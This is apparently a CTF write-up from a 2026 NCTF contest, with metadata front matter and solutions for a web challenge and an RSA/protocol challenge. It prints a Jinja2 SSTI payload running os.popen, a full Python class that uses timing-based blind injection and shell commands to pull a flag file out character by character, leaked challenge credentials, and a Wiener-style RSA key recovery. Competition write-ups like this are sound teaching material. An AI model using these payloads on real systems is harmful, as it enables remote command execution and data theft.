---
title: 2026 NCTF Writeup by Mini-Venom（Blind SSTI + 连分数 Wiener 攻击）
contest: 2026 NCTF
year: 2026
difficulty: hard
vuln_type: [ssti, crypto_rsa, web_unknown, jwt]
tags: [NCTF 2026, BlindSSTIExploit 时延盲注, cycler.__init__.__globals__.os.popen sleep 5, 字符集 {}_- + ascii + digits, N-RustPICA SPA js 源码泄露, /api/admin/templates/review-flow, anime_admin/purestream 凭据, 连分数 e/N^6 展开 收敛分母 d, Wiener 攻击 RSA 小 d, GAME 协议 Magic 0x47414D45]
attack_chain:
  - Blind SSTI: cycler.__init__.__globals__.os.popen('sleep 5').read() → 时延判 RCE
  - find_flag_path: test -f /flag && sleep delay
  - get_length: [ $(wc -c < /flag) -eq N ] && sleep delay
  - extract_char: [ "$(cut -c POS /flag)" = 'C' ] && sleep delay
  - N-RustPICA: js 源码泄露 /api/admin/templates/review-flow 接口
  - anime_admin / purestream 凭据
  - 读取 N, e, c → 连分数 e/N^6 展开 → 收敛分母 d
  - 验证 pow(pow(2, e, N), d, N) == 2 → d 正确
  - m = c^d mod N
  - GAME 协议 Magic=0x47414D45 → 五子棋协议
  - 7 选 7: payload = "%d,%d" 走棋
  - 5 选 5: 随机匹配对手 → 赢了 N 次 拿 flag
key_payload: "Wiener 攻击：e/N^6 连分数展开 → 收敛分母 d"
one_liner: 2026 NCTF Web: Blind SSTI 时延盲注 + N-RustPICA js 源码泄露 + Wiener 攻击 + GAME 五子棋协议走棋拿 flag。
lesson: Blind SSTI 时延盲注模板: `sleep N` 判 RCE → find_flag_path → wc -c 算长度 → cut -c 提字符；RSA Wiener 攻击 `e/N^k` 连分数展开（k=6 是 N-RustPICA 变种）。
quality: high
---

# 2026 NCTF Writeup by Mini-Venom

## Web: N-Horse（Blind SSTI）

```python
# 测试 SSTI
GET /?username={{cycler.__init__.__globals__.os.popen('sleep 5').read()}}&password=1
# 5 秒延迟 → RCE 确认
```

### BlindSSTIExploit 类

```python
class BlindSSTIExploit:
    def __init__(self, base_url, delay, timeout, charset, proxy=None):
        self.base_url = base_url.rstrip("/") + "/"
        self.delay = delay
        self.timeout = timeout
        self.charset = charset  # "{}_-" + ascii_letters + digits

    def build_payload(self, command):
        escaped = command.replace("\\", "\\\\").replace("'", "\\'")
        return "{{cycler.__init__.__globals__.os.popen('%s').read()}}" % escaped

    def request_time(self, payload):
        start = time.time()
        try:
            self.session.get(self.base_url, params={"username": payload, "password": "1"}, timeout=self.timeout)
        except: pass
        return time.time() - start

    def oracle(self, command, threshold=None):
        payload = self.build_payload(command)
        elapsed = self.request_time(payload)
        limit = threshold if threshold is not None else (self.delay - 0.5)
        return elapsed > limit, elapsed

    def find_flag_path(self, paths):
        for path in paths:
            ok, _ = self.oracle(f"test -f {path} && sleep {self.delay}")
            if ok: return path

    def get_length(self, path, max_len):
        for size in range(1, max_len + 1):
            ok, _ = self.oracle(f"[ $(wc -c < {path}) -eq {size} ] && sleep {self.delay}")
            if ok: return size

    def extract_char(self, path, position):
        for ch in self.charset:
            ok, _ = self.oracle(f'[ "$(cut -c {position} {path})" = \'{ch}\' ] && sleep {self.delay}')
            if ok: return ch
```

**用法**：`python exp.py -u url -d 3 -t 8 -m 80`

## N-RustPICA（js 源码泄露 + Wiener）

- js 源码泄露 `/api/admin/templates/review-flow` 接口
- 凭据：`anime_admin / purestream`
- 给 N, e, c → **Wiener 攻击**：
  - 对 `e / N^6` 做连分数展开
  - 收敛分母作为候选 d
  - 验证 `pow(pow(2, e, N), d, N) == 2`
  - `m = pow(c, d, N)`
- GAME 协议：Magic = 0x47414D45
- 走棋命令 payload 格式 `"%d,%d"`
